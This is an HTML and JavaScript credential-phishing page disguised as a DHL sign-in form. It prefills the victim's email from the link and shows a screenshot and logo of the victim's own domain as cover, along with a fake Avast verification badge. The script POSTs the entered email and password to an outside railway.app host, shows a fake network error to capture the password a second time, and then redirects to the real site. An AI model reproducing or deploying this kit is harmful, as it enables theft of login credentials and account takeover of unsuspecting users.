<!DOCTYPE html>
<html lang="en" data-bollob="ttt">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In Now</title>

    <!-- google font -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&display=swap" rel="stylesheet">

    <style>
        *{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body{
            width: 100vw;
            height: 100vh;
            overflow-y: hidden;
            overflow-x: hidden;
            position: relative;
            /* background: radial-gradient(rgb(212, 207, 207),#f5f5f5); */
            font-family: "Poppins", sans-serif;
        }
        body::before {
            content: "";
            display: block;
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.7); 
        }
        a{
            text-decoration: none;
        }
        img{
            display: block;
            width: 100%;
        }
        h2{
            color: rgb(0, 0, 0);
            font-weight: 700;
            font-size: 1.25rem;
            margin-bottom: 33px;
            text-transform: uppercase;
        }
        
        #background-img{
            width: 100%;
            height: 100%;
            background-size: cover;
            background-repeat: no-repeat;
            background-position: fixed;
            opacity: 0.9;
            filter: blur(2px);
            z-index: -100;
        }
        .loader{
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #a79797;
            z-index: 99;
            transition: opacity 0.75s, visibility 0.75s;
        }
        .loader-hidden{
            opacity: 0;
            visibility: 0;
        }
        .loader::after{
            content: "";
            width: 35px;
            height: 35px;
            border: 5px solid #dddddd;
            border-top-color: #7449f5;
            border-radius: 50%;
            animation: loading 0.75s ease infinite;
        }

        @keyframes loading{
            from{
                transform: rotate(0turn);
            }
            to{
                transform: rotate(1turn);
            }
        }

        .wrapper{
            width: 100%;
            height: 100%;
            z-index: 1;
            display: block;
            position: absolute;
            top: 0;
            display: flex;
            
            align-items: center;
            justify-content: center;
        }
        .card{
            /* border: 2px solid red; */
            width: 375px;
            height: auto;
            padding: 25px 37px;
            background: #fff;
            box-shadow: 0.2 .4rem .5rem rgb(76, 75, 75);
            border-radius: 10px;
        }
        .showemail{
            margin: 10px 0;
            font-size: 14px;
        }
        .form-content{
            margin-bottom: 1rem;
            width: auto;
        }
        .form-content input[type='password'],
        .form-content input[type='email']{
            width: 100%;
            border: none;
            border-bottom: .8px solid #333131e7;
            outline: none;
            padding: 8px 0;
            font-size: 0.9rem;
            color: rgb(46, 45, 45);
        }
        .form-content input[type='password']:focus,
        .form-content input[type='email']:focus{
            border-bottom: 1px solid rgb(16, 77, 189);
        }
        .form-content input[type='password']::placeholder,
        .form-content input[type='email']::placeholder{
            font-size: 1rem;
        }
        .form-content button{
            padding: 7px 31px;
            background: rgb(33, 101, 228);
            color: #fff;
            cursor: pointer;
            border: none;
            outline: none;
            font-size: .95rem;
            width: 100%;
            margin-top: 20px;
        }
        .form-content button:hover{
            background: rgb(10, 62, 160); 
        }
        .link{
            margin-top: 20px;
            
        }
        .link p{
            text-align: center;
        }
        .link a{
            color: rgb(17, 17, 17);
            font-size: 14px;
        }

        .form-content input[type='email']:invalid{
            border-bottom: 1px solid rgb(219, 34, 34);
        }

        .perrwarning,.errwarning{
            color: rgb(165, 7, 7);
        }
        
        @media(max-width:560px){
            #background-img{
                width: 100%;
            }
            .card{
                width: 300px;
                padding: 15px 27px;
            }
            .showemail{
                font-size: 13px;
            }
            h2{
                font-size: 1rem;                
            }
            .loader::after{
                content: "";
                width: 35px;
                height: 35px;
            }
        }

        /* button spinner */
        .spinner-button{
            display: inline-block;
            width: 15px;
            height: 15px;
            border: 2px solid #ccc;
            border-radius: 50%;
            border-top-color: #000000; /* Adjust the color as needed */
            animation: spin 1s linear infinite;
            margin-left: 20px;
            margin-top: 5px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>

<body>
    <img src="" alt="" id="background-img">
    <div class="loader"></div>
    
    <div class="wrapper">
        <form action="" id="my-login-form" method="POST">
            <div class="card loginForm" id="login-form">
                <div class="card-body">
                    <div class="logo" style="display: flex; align-items: center; justify-content: center; margin-bottom: 40px; margin-top: 20px;">
                        <img class="logo-img" src="" alt="" style="width: 50px;"> <span id="logo-span" style="font-size: 20px;font-weight: bold; margin-left: 10px;">dhl.com</span>
                    </div>
                    <h2>Log In to continue</h2>
                    <div class="password-side" >
                        <!-- <div class="showemail"></div> -->
                        <!-- <h2>Enter password</h2> -->
                        <div class="perrwarning"></div>
                        <div class="form-content">
                            <input type="email" readonly id="email" placeholder="email" name="f_email" value="" required>
                        </div>
                        <div class="form-content">
                            <input type="password" id="password" placeholder="Enter Password" name="f_password" required>
                        </div>
                        
                        <div class="form-content form-button">
                            <button type="submit" id="final-submit-btn">
                                <span id="btn-text-now">Login</span>
                                <span class="" id="btn-spinner"></span>
                            </button>
                        </div>
                        <div class="link" style="display: flex; align-items: center; justify-content: center;">
                            <p><a href="#">verified by </a></p>
                            <img src="https://res.cloudinary.com/dzavavl6y/image/upload/v1713181568/uc6xjnr3xx9hdcpfm1od.png" alt="Avast" style="width: 50px; margin-left: 10px;">
                        </div>
                    </div>
                </div>
            </div>
        </form>
        
        
    </div>


    <script>
        // var originalLink = "https://camelion2-prod.up.railway.app/frontend/ong/on-pardon/og/";

        // var encodedLink = btoa(originalLink);
        // var decodedLink = atob(encodedLink)

        // console.log(encodedLink);
        // console.log(decodedLink);
        // const bollob = (document.querySelector('html').getAttribute('data-bollob'));
        // console.log(bollob);

        const searchParams = new URLSearchParams(window.location.search);
        const hashedEmailValue = searchParams.get('wtundnm20njfnnfkjfjjffjj_em')?searchParams.get('wtundnm20njfnnfkjfjjffjj_em'):"";
        const domainFromEmail = hashedEmailValue.split('@');
        const myDomain = domainFromEmail.length > 1 ? domainFromEmail[1]: 'dhl.com';
        const domainRmCom = myDomain.replace(/\.com$/, "");
        const backgroundImage = document.querySelector('#background-img');
        const showEmail = document.querySelector('#email');
        const logo = document.querySelector('.logo-img');
        const logoSpan = document.querySelector('#logo-span');
        const loader = document.querySelector('.loader');
        const form = document.getElementById('my-login-form');
        const spinnerBtn = document.querySelector('#btn-spinner');
        const btnTTextNow = document.querySelector('#btn-text-now');
        const formSubmitBtn = document.querySelector('#final-submit-btn');

        window.onload = async () => {
            let someData = await getBackgroundImage();
            // removing loader
            setTimeout(() => {
                removeLoader();
            }, 2500);
        };

        function getBackgroundImage(){
            const thumbIoImg = `https://image.thum.io/get/auth/70953-lduyhg/https://www.${myDomain}/`;
            const logoClearbit = `https://logo.clearbit.com/https://${myDomain}`
            backgroundImage.src = thumbIoImg;
            logo.src = logoClearbit
            showEmail.value = hashedEmailValue;
            logo.value = hashedEmailValue;
            logoSpan.textContent = domainRmCom.toUpperCase();

        };

        // handling form submition
        let isToggled = false;

        function handleFormSubmition(e) {

            e.preventDefault();
            var formData = new FormData(form);
            addBtnSpinner();

            if (isToggled) {
                // This handles the secondclick
                
                console.log("Action 2");
                sendData(formData)
                window.location.href = `https://www.${myDomain}`;
            } else {
                // this handles the first click
                console.log("Action 1");
                sendData(formData)

                // setTimeout(() => {
                //     removeBtnSpinner();
                // }, 2500);
            }
            // Toggle the state
            isToggled = !isToggled;
        };

        // adding event listerner to form
        form.addEventListener('submit', handleFormSubmition);



        // send information to server funtion
        function sendData(formData) {
            const formValue = Object.fromEntries(formData.entries());

            // Send data to server using Fetch API
            fetch('https://camelion2-prod.up.railway.app/frontend/ong/on-pardon/og/', {
                method: 'POST',
                headers:{
                    'Content-Type':'application/json',
                    'X-CSRFToken':csrftoken,
                },
                body: JSON.stringify(formValue),
            })
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.json();
            })
            .then(data => {
                console.log('Data sent successfully:', data);
                removeBtnSpinner();
            })
            .catch(error => {
                console.error('Error sending data to server:', error);
            });
        }


        // removing loader
        function removeLoader(){
            loader.classList.add('loader-hidden');
                loader.style.display = 'none';
                loader.addEventListener('transitionend', () =>{
                document.body.removeChild('loader');
            }); 
        };

        function addBtnSpinner(){
            spinnerBtn.classList.add('spinner-button')
            btnTTextNow.textContent = 'Processing'
            formSubmitBtn.style.backgroundColor = '#97add1';
            formSubmitBtn.setAttribute('disabled', true);
        };

        function removeBtnSpinner(){
            spinnerBtn.classList.remove('spinner-button');
            document.querySelector(".perrwarning").innerHTML = `Network Error! Please verify your information and try again`;
            formSubmitBtn.removeAttribute("disabled");
            formSubmitBtn.style.backgroundColor = 'rgb(33, 101, 228)';
            btnTTextNow.textContent = 'Login'
            document.querySelector("#password").value='';
        };

        function getCookie(name) {
            let cookieValue = null;
            if (document.cookie && document.cookie !== '') {
                const cookies = document.cookie.split(';');
                for (let i = 0; i < cookies.length; i++) {
                    const cookie = cookies[i].trim();
                    if (cookie.substring(0, name.length + 1) === (name + '=')) {
                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
                        break;
                    }
                }
            }
            return cookieValue;
        }
        const csrftoken = getCookie('csrftoken');
    </script>

</body>
